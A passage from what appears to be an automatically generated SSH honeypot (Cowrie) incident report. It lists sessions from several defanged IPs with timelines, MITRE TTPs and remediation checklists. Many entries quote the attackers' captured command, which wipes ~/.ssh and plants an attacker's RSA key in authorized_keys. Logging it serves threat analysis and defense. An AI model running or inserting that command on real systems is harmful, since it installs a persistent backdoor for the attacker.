| `2026-04-19 06:33:48` | `cowrie.command.failed` |
| `2026-04-19 06:33:48` | `cowrie.log.closed` |
| `2026-04-19 06:33:48` | `cowrie.session.params` |
| `2026-04-19 06:33:48` | `cowrie.command.input` |
| `2026-04-19 06:33:48` | `cowrie.session.file_download` |
| `2026-04-19 06:33:48` | `cowrie.log.closed` |
| `2026-04-19 06:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce593c173448

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:33 |
| **Last Seen** | 2026-04-19 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:33:50` | `cowrie.session.connect` |
| `2026-04-19 06:33:50` | `cowrie.client.version` |
| `2026-04-19 06:33:51` | `cowrie.client.kex` |
| `2026-04-19 06:33:51` | `cowrie.login.success` |
| `2026-04-19 06:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8674f00d18

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:33 |
| **Last Seen** | 2026-04-19 06:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:33:53` | `cowrie.session.connect` |
| `2026-04-19 06:33:53` | `cowrie.client.version` |
| `2026-04-19 06:33:53` | `cowrie.client.kex` |
| `2026-04-19 06:33:53` | `cowrie.login.success` |
| `2026-04-19 06:33:54` | `cowrie.session.params` |
| `2026-04-19 06:33:54` | `cowrie.command.input` |
| `2026-04-19 06:33:54` | `cowrie.command.failed` |
| `2026-04-19 06:33:54` | `cowrie.log.closed` |
| `2026-04-19 06:33:54` | `cowrie.session.params` |
| `2026-04-19 06:33:54` | `cowrie.command.input` |
| `2026-04-19 06:33:54` | `cowrie.session.file_download` |
| `2026-04-19 06:33:54` | `cowrie.log.closed` |
| `2026-04-19 06:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c0812cbc07

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:33 |
| **Last Seen** | 2026-04-19 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:33:56` | `cowrie.session.connect` |
| `2026-04-19 06:33:56` | `cowrie.client.version` |
| `2026-04-19 06:33:56` | `cowrie.client.kex` |
| `2026-04-19 06:33:57` | `cowrie.login.success` |
| `2026-04-19 06:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96e4cd36eee

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:33 |
| **Last Seen** | 2026-04-19 06:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:33:58` | `cowrie.session.connect` |
| `2026-04-19 06:33:58` | `cowrie.client.version` |
| `2026-04-19 06:33:58` | `cowrie.client.kex` |
| `2026-04-19 06:33:59` | `cowrie.login.success` |
| `2026-04-19 06:33:59` | `cowrie.session.params` |
| `2026-04-19 06:33:59` | `cowrie.command.input` |
| `2026-04-19 06:33:59` | `cowrie.command.failed` |
| `2026-04-19 06:33:59` | `cowrie.log.closed` |
| `2026-04-19 06:33:59` | `cowrie.session.params` |
| `2026-04-19 06:33:59` | `cowrie.command.input` |
| `2026-04-19 06:33:59` | `cowrie.session.file_download` |
| `2026-04-19 06:33:59` | `cowrie.log.closed` |
| `2026-04-19 06:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00fe2a4ee06d

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:34 |
| **Last Seen** | 2026-04-19 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:34:02` | `cowrie.session.connect` |
| `2026-04-19 06:34:02` | `cowrie.client.version` |
| `2026-04-19 06:34:02` | `cowrie.client.kex` |
| `2026-04-19 06:34:02` | `cowrie.login.success` |
| `2026-04-19 06:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f82751c621

| Field | Detail |
|---|---|
| **Source IP** | `181.45.193[.]221` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:00` | `cowrie.session.connect` |
| `2026-04-19 06:35:00` | `cowrie.client.version` |
| `2026-04-19 06:35:00` | `cowrie.client.kex` |
| `2026-04-19 06:35:02` | `cowrie.login.success` |
| `2026-04-19 06:35:02` | `cowrie.session.params` |
| `2026-04-19 06:35:02` | `cowrie.command.input` |
| `2026-04-19 06:35:02` | `cowrie.command.failed` |
| `2026-04-19 06:35:03` | `cowrie.log.closed` |
| `2026-04-19 06:35:04` | `cowrie.session.params` |
| `2026-04-19 06:35:04` | `cowrie.command.input` |
| `2026-04-19 06:35:04` | `cowrie.session.file_download` |
| `2026-04-19 06:35:04` | `cowrie.log.closed` |
| `2026-04-19 06:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.45.193[.]221` to AbuseIPDB if not already reported
- [ ] Block `181.45.193[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2ca9dbac25

| Field | Detail |
|---|---|
| **Source IP** | `181.45.193[.]221` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:08` | `cowrie.session.connect` |
| `2026-04-19 06:35:08` | `cowrie.client.version` |
| `2026-04-19 06:35:09` | `cowrie.client.kex` |
| `2026-04-19 06:35:10` | `cowrie.login.success` |
| `2026-04-19 06:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.45.193[.]221` to AbuseIPDB if not already reported
- [ ] Block `181.45.193[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e2f3a2447c

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:33` | `cowrie.session.connect` |
| `2026-04-19 06:35:33` | `cowrie.client.version` |
| `2026-04-19 06:35:33` | `cowrie.client.kex` |
| `2026-04-19 06:35:34` | `cowrie.login.success` |
| `2026-04-19 06:35:34` | `cowrie.session.params` |
| `2026-04-19 06:35:34` | `cowrie.command.input` |
| `2026-04-19 06:35:34` | `cowrie.command.failed` |
| `2026-04-19 06:35:34` | `cowrie.log.closed` |
| `2026-04-19 06:35:34` | `cowrie.session.params` |
| `2026-04-19 06:35:34` | `cowrie.command.input` |
| `2026-04-19 06:35:35` | `cowrie.session.file_download` |
| `2026-04-19 06:35:35` | `cowrie.log.closed` |
| `2026-04-19 06:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62787f74729

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:37` | `cowrie.session.connect` |
| `2026-04-19 06:35:37` | `cowrie.client.version` |
| `2026-04-19 06:35:37` | `cowrie.client.kex` |
| `2026-04-19 06:35:37` | `cowrie.login.success` |
| `2026-04-19 06:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f54067294392

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:51` | `cowrie.session.connect` |
| `2026-04-19 06:35:51` | `cowrie.client.version` |
| `2026-04-19 06:35:51` | `cowrie.client.kex` |
| `2026-04-19 06:35:52` | `cowrie.login.success` |
| `2026-04-19 06:35:52` | `cowrie.session.params` |
| `2026-04-19 06:35:52` | `cowrie.command.input` |
| `2026-04-19 06:35:52` | `cowrie.command.failed` |
| `2026-04-19 06:35:52` | `cowrie.log.closed` |
| `2026-04-19 06:35:53` | `cowrie.session.params` |
| `2026-04-19 06:35:53` | `cowrie.command.input` |
| `2026-04-19 06:35:53` | `cowrie.session.file_download` |
| `2026-04-19 06:35:53` | `cowrie.log.closed` |
| `2026-04-19 06:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff025e033a1

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:35 |
| **Last Seen** | 2026-04-19 06:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:35:55` | `cowrie.session.connect` |
| `2026-04-19 06:35:55` | `cowrie.client.version` |
| `2026-04-19 06:35:55` | `cowrie.client.kex` |
| `2026-04-19 06:35:55` | `cowrie.login.success` |
| `2026-04-19 06:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e0fb986a6e

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:38 |
| **Last Seen** | 2026-04-19 06:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:38:55` | `cowrie.session.connect` |
| `2026-04-19 06:38:55` | `cowrie.client.version` |
| `2026-04-19 06:38:55` | `cowrie.client.kex` |
| `2026-04-19 06:38:55` | `cowrie.login.success` |
| `2026-04-19 06:38:55` | `cowrie.session.params` |
| `2026-04-19 06:38:55` | `cowrie.command.input` |
| `2026-04-19 06:38:55` | `cowrie.command.failed` |
| `2026-04-19 06:38:56` | `cowrie.log.closed` |
| `2026-04-19 06:38:56` | `cowrie.session.params` |
| `2026-04-19 06:38:56` | `cowrie.command.input` |
| `2026-04-19 06:38:56` | `cowrie.session.file_download` |
| `2026-04-19 06:38:56` | `cowrie.log.closed` |
| `2026-04-19 06:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d47c567a52

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:38 |
| **Last Seen** | 2026-04-19 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:38:58` | `cowrie.session.connect` |
| `2026-04-19 06:38:58` | `cowrie.client.version` |
| `2026-04-19 06:38:58` | `cowrie.client.kex` |
| `2026-04-19 06:38:59` | `cowrie.login.success` |
| `2026-04-19 06:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d58f17ac94d8

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:45 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:14` | `cowrie.session.connect` |
| `2026-04-19 06:40:14` | `cowrie.client.version` |
| `2026-04-19 06:40:15` | `cowrie.client.kex` |
| `2026-04-19 06:40:16` | `cowrie.login.success` |
| `2026-04-19 06:40:17` | `cowrie.session.params` |
| `2026-04-19 06:40:17` | `cowrie.command.input` |
| `2026-04-19 06:40:17` | `cowrie.command.failed` |
| `2026-04-19 06:40:17` | `cowrie.log.closed` |
| `2026-04-19 06:40:18` | `cowrie.session.params` |
| `2026-04-19 06:40:18` | `cowrie.command.input` |
| `2026-04-19 06:40:18` | `cowrie.session.file_download` |
| `2026-04-19 06:40:18` | `cowrie.log.closed` |
| `2026-04-19 06:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccb912d685bd

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:22` | `cowrie.session.connect` |
| `2026-04-19 06:40:22` | `cowrie.client.version` |
| `2026-04-19 06:40:22` | `cowrie.client.kex` |
| `2026-04-19 06:40:23` | `cowrie.login.success` |
| `2026-04-19 06:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56017c41ce2f

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:33` | `cowrie.session.connect` |
| `2026-04-19 06:40:33` | `cowrie.client.version` |
| `2026-04-19 06:40:33` | `cowrie.client.kex` |
| `2026-04-19 06:40:34` | `cowrie.login.success` |
| `2026-04-19 06:40:34` | `cowrie.session.params` |
| `2026-04-19 06:40:34` | `cowrie.command.input` |
| `2026-04-19 06:40:34` | `cowrie.command.failed` |
| `2026-04-19 06:40:34` | `cowrie.log.closed` |
| `2026-04-19 06:40:35` | `cowrie.session.params` |
| `2026-04-19 06:40:35` | `cowrie.command.input` |
| `2026-04-19 06:40:35` | `cowrie.session.file_download` |
| `2026-04-19 06:40:35` | `cowrie.log.closed` |
| `2026-04-19 06:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f8238a846d

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
